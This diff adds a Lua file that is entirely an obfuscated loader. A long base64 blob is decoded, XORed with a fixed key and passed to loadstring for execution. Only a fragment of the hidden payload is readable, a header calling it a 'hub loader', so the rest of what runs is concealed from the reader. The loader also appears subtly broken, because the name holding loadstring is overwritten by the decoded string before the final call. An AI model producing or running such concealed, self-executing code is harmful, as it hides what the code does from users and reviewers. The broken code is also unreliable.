@@ -1,0 +1,46 @@
+local O000O0O00=(loadstring or load)
+local O0OOOOOO0=135
+local OOOOO0000=[[
+jaqq3NynzMjVyMunz9LFp8vIxsPC1afa2o3r6OTm66fE6PXiwPLup7qn4Obq4r3A4vPU4vXx7uTir6XE6PXiwPLupa6N6+jk5uun0/Di4unU4vXx7uTip7qn4Obq4r3A4vPU4vXx7uTir6XT8OLi6dTi9fHu5OKlro2N6+jk5uun2NXCxsvYzMLep7qn9PP17ungqeTv5vWvsrCrp7K3q6eysauns76ujevo5Obrp9jLzsnMp7qn9PP17ungqeTv5vWvtrezq6e2trGrp7a2saun
+tra1q6e2trKrp7K/q6ezsKuns7Crp7a3v6untreyq6e2trerp7a3sKuns7Krp76+q6e2t7arp7a2t6untraxq6e2t7arp7a2s6uns7Grp7a2t6untre2q6e2trGrp7Owq6eyt6unsrOrp7K3q6eysaunsrOrp7K0q6ezv6uns7Crp7+xq6exvquntre2q6e+t6uns7+rp7a3sKunsLerp7K3q6eytqunsLSrp7a3vqunvreujevo5Obrp9jXxt7LyMbDp7qn9PP17ungqeTv5vWv
+trezq6e2trGrp7a2sauntra1q6e2trKrp7K/q6ezsKuns7Crp7a2s6unvrCrp7a2vquns7Grp7a3tKuntreyq6e2trGrp7a3s6untrawq6e+v6untrawq6e2trKrp7a3tquntrazq6e+vquntra2q6e2trerp7a2sauntre2q6e2trerp7a2sauns7Grp76+q6e2trarp7a3vquns7Crp7a2t6untra2q6e2trerp76wq6e2t76rp7a3tquntre+q6e+sKuntra3q6e2trKrp7a3
+t6uns7Crp7a2s6untra2q6e+v6untre/q6e2trarp7a1t6untrayq6e+vquntrazq6e2t7Krp7a2tauntraxq6e2trKrp7Owq6e2t76rp76wq6e2t7Krp7a2t6uns7Crp7C/q6exvqunv7Crp76yq6e2t7Wrp7a3v6untreyq6e+vquntrewq6e+squns7Krp76yq6exsquntreyq6e2t76rp76/q6e2trarp7a2saunvrKrp7+0q6e2trGrp76wq6e+vquntrewq6e+squnv7er
+p76wq6e2tbarp7a3v6untra2q6e+sKuntre3q6e+squnsrCrp7Kyq6ezv6uns7+rp7a3tqunsrSrp7O+q6eytKuns7Grp7a3v6untrawq6e+sK6Nje7hp8To9eLA8u69we7p48Hu9fTzxO/u6+Ovpevuzsu2y6Wup/Pv4umnxOj14sDy7tyl6+7Oy7bLpdq9w+L08/Xo/q+up+Lp442N6+jk5uun1OT14uLpwPLup7qnzun08+bp5OKp6eLwr6XU5PXi4unA8u6lro3U5PXi4unA
+8u6pyebq4qe6p6Xr7s7LtsuljdTk9eLi6cDy7qnX5vXi6fOnuqfE6PXiwPLujY3r6OTm66fK5u7pp7qnzun08+bp5OKp6eLwr6XB9ebq4qWujcrm7umpyebq4qe6p6XK5u7pwfXm6uKljcrm7ump1+b14unzp7qn1OT14uLpwPLujcrm7umpxebk7OD16PLp48To6+j1tKe6p8To6+j1tKnh9ejq1cDFr7W3q6e1t6untbKujcrm7ump1+j07vPu6OmnuqfSw+7qtanp4vCvt6my
+q6eqtrK3q6e3qbKrp6q2t7eujcrm7ump1O794qe6p9LD7uq1qeni8K+3q6e3q6e3q6e3ro3K5u7pqcTr7vf0w+L05OLp4+bp8/Snuqfz9fLijcrm7umpxunk7+j11+ju6fOnuqfR4uTz6PW1qeni8K+3qbKrp7epsq6Njevo5Obrp9LEp7qnzun08+bp5OKp6eLwr6XSzsTo9eni9aWrp8rm7umujdLEqcTo9eni9dXm4+7y9Ke6p9LD7uqp6eLwr7erp7a3ro2N6+jk5uun1PP1
+6Ozip7qnzun08+bp5OKp6eLwr6XSztTz9ejs4qWrp8rm7umujdTz9ejs4qnE6Ovo9ae6p8To6+j1tKnh9ejq1cDFr7erp7WysquntrW3ro3U8/Xo7OKp0+/u5Ozp4vT0p7qntqmyjY3T8OLi6dTi9fHu5OK9xPXi5vPir8rm7umrp9Pw4uLpzunh6Knp4vCvt6mxq6fC6fLqqcLm9O7p4NTz/uviqcXm5Oyuq6f81O794qe6p9LD7uq1qeni8K+3q6e0tberp7erp7a/t676rr3X
+6+b+r66N8+b07Knw5u7zr7epsq6Njevo5Obrp9Pu8+vip7qnzun08+bp5OKp6eLwr6XT4v/zy+bl4uulq6fK5u7pro3T7vPr4qnT4v/zp7qnpczI1cjLp8/SxafUwsTS1c7T3qWN0+7z6+Kpwejp86e6p8Lp8uqpwejp86nA6PPv5urF6OvjjdPu8+viqdPi//PU7v3ip7qntr+N0+7z6+Kp0+L/88To6+j1tKe6p8To6+j1tKnp4vCvtqu2q7aujdPu8+viqdTu/eKnuqfSw+7q
+tanp4vCvtqunt6unt6uns7eujdPu8+viqcXm5Ozg9ejy6ePT9ebp9Pfm9eLp5P6nuqe2jY3r6OTm66fM4v7F6P+nuqfO6fTz5unk4qnp4vCvpdPi//PF6P+lq6fK5u7pro3M4v7F6P+p1+vm5OLv6Ovj4vXT4v/zp7qnpcLp8+L1p8zi/qmpqaWNzOL+xej/qdPi//OnuqelpY3M4v7F6P+p0+L/88To6+j1tKe6p8To6+j1tKnp4vCvtqu2q7aujczi/sXo/6nF5uTs4PXo8unj
+xOjr6PW0p7qnxOjr6PW0qeH16OrVwMWvtLerp7S3q6e0sq6NzOL+xej/qdTu/eKnuqfSw+7qtanp4vCvt6m/q6e3q6e3q6e0sq6NzOL+xej/qdfo9O7z7ujpp7qn0sPu6rWp6eLwr7eptqunt6unt6m0squnt66NzOL+xej/qcHo6fOnuqfC6fLqqcHo6fOpwOjz7+bqjczi/sXo/6nT4v/z1O794qe6p7azjc7p9PPm6eTiqeni8K+l0s7E6PXp4vWlq6fM4v7F6P+uqcTo9eni
+9dXm4+7y9Ke6p9LD7uqp6eLwr7erp7GujY3r6OTm66fl8+nA4vOnuqfO6fTz5unk4qnp4vCvpdPi//PF8vPz6Omlq6fK5u7pro3l8+nA4vOp0+L/86e6p6XAwtOnzMLepY3l8+nA4vOpxebk7OD16PLp48To6+j1tKe6p8To6+j1tKnh9ejq1cDFr7O3q6ezt6uns7KujeXz6cDi86nT4v/zxOjr6PW0p7qnxOjr6PW0qeni8K+3qbCrp7epsKunt6mwro3l8+nA4vOp1O794qe6
+p9LD7uq1qeni8K+3qbS/q6e3q6e3q6e0sq6N5fPpwOLzqdfo9O7z7ujpp7qn0sPu6rWp6eLwr7eptqunt6unt6mxsqunt66N5fPpwOLzqcHo6fOnuqfC6fLqqcHo6fOpwOjz7+bqxejr443l8+nA4vOp0+L/89Tu/eKnuqe2tY3O6fTz5unk4qnp4vCvpdLOxOj16eL1paun5fPpwOLzrqnE6PXp4vXV5uPu8vSnuqfSw+7qqeni8K+3q6exro2N6+jk5uun5fPpxO/i5OynuqfO
+6fTz5unk4qnp4vCvpdPi//PF8vPz6Omlq6fK5u7pro3l8+nE7+Lk7KnT4v/zp7qnpcTPwsTMp8zC3qWN5fPpxO/i5Oypxebk7OD16PLp48To6+j1tKe6p8To6+j1tKnh9ejq1cDFr7erp7WysquntrW3ro3l8+nE7+Lk7KnT4v/zxOjr6PW0p7qnxOjr6PW0qeH16OrVwMWvtberp7W3q6e1t66N5fPpxO/i5Oyp1O794qe6p9LD7uq1qeni8K+3qbS/q6e3q6e3q6e0sq6N5fPp
+xO/i5Oyp1+j07vPu6OmnuqfSw+7qtanp4vCvt6mytaunt6unt6mxsqunt66N5fPpxO/i5Oypwejp86e6p8Lp8uqpwejp86nA6PPv5urF6OvjjeXz6cTv4uTsqdPi//PU7v3ip7qntrWNzun08+bp5OKp6eLwr6XSzsTo9eni9aWrp+Xz6cTv4uTsrqnE6PXp4vXV5uPu8vSnuqfSw+7qqeni8K+3q6exro2N5fPpwOLzqcro8vTixfLz8+jptsTr7uTsvcTo6eni5POv4fLp5PPu
+6Omvro2np6en5fPpwOLzqdPi//OnuqelxMjXzsLDpqWNp6enp/Ti8+Tr7vfl6Ob146/Yy87JzK6Np6enp/Pm9Oyp8Obu86+1ro2np6en5fPpwOLzqdPi//OnuqelwMLTp8zC3qWN4unjro2N5fPpxO/i5Oypyujy9OLF8vPz6Om2xOvu5Oy9xOjp6eLk86/h8unk8+7o6a+ujaenp6fu4afM4v7F6P+p0+L/86e6uqfY1cLGy9jMwt6n8+/i6Y2np6enp6enp+Xz6cTv4uTsqdPi
+//Onuqel1NLExMLU1Kaljaenp6enp6en0/Di4unU4vXx7uTivcT14ubz4q/K5u7pq6fT8OLi6c7p4eip6eLwr7epsq6rp/zU7v3ip7qn0sPu6rWp6eLwr7ert6u3q7eu+q691+vm/q+ujaenp6enp6en8+b07Knw5u7zr7epsq6Np6enp6enp6fU5PXi4unA8u69w+L08/Xo/q+ujaenp6enp6en6+jm4/Tz9e7p4K/g5urivc/z8/fA4vOv2NfG3svIxsOurq+ujaenp6fi6/Ti
+jaenp6enp6en5fPpxO/i5Oyp0+L/86e6p6XQ1cjJwKfMwt6ljaenp6enp6en5fPpxO/i5Oypxebk7OD16PLp48To6+j1tKe6p8To6+j1tKnh9ejq1cDFr7Wysqunsrerp7K3ro2np6enp6enp/Pm9Oyp8Obu86+2ro2np6enp6enp+Xz6cTv4uTsqdPi//OnuqelxM/CxMynzMLepY2np6enp6enp+Xz6cTv4uTsqcXm5Ozg9ejy6ePE6Ovo9bSnuqfE6Ovo9bSp4fXo6tXAxa+3
+q6e1srKrp7a1t66Np6enp+Lp443i6eOujQ==
+]]
+local OOOOOOO00='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+local function O00000O0O(b)
+    b=b:gsub('%s+','')
+    b=b:gsub('[^'..OOOOOOO00..'=]','')
+    return (b:gsub('.', function(x)
+        if x=='=' then return '' end
+        local r,f='',(OOOOOOO00:find(x,1,true)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if #x~=8 then return '' end
+        local c=0
+        for i=1,8 do if x:sub(i,i)=='1' then c=c+2^(8-i) end end
+        return string.char(c)
+    end))
+end
+local O000O0O00=O00000O0O(OOOOO0000)
+local O0OOO000O=(bit32 and bit32.bxor) or function(a,b) return a ~ b end
+local OO00OO00O={}
+for O00OO00O0=1,#O000O0O00 do
+    OO00OO00O[O00OO00O0]=string.char(O0OOO000O(O000O0O00:byte(O00OO00O0),O0OOOOOO0))
+end
+O000O0O00(table.concat(OO00OO00O))()
